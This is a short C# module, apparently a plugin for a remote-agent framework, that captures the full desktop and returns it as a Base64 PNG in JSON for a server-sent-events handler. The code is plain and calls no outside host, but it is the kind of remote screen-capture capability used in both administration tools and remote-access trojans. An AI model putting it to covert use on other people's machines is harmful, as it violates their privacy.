/*
{
  "name":    "screenshot",
  "author":  "William",
  "version": "WORK IN PROGRESS",
  "desc":    "Captures a full-desktop screenshot and returns it as a Base64-PNG JSON payload",
  "args":    []
}
*/

using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;

public class Module
{
    public static string Run(string[] args)
    {
        try
        {
            var bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
            using (var bmp = new Bitmap(bounds.Width, bounds.Height))
            using (var g   = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(0, 0, 0, 0, bounds.Size);
                using (var ms = new MemoryStream())
                {
                    bmp.Save(ms, ImageFormat.Png);
                    var b64 = Convert.ToBase64String(ms.ToArray());
                    // wrap in JSON so the SSE handler can pick it out:
                    return "{\"screenshot\":\"" + b64 + "\"}";
                }
            }
        }
        catch (Exception ex)
        {
            var msg = ex.Message.Replace("\"", "\\\"");
            return "{\"error\":\"" + msg + "\"}";
        }
    }
}
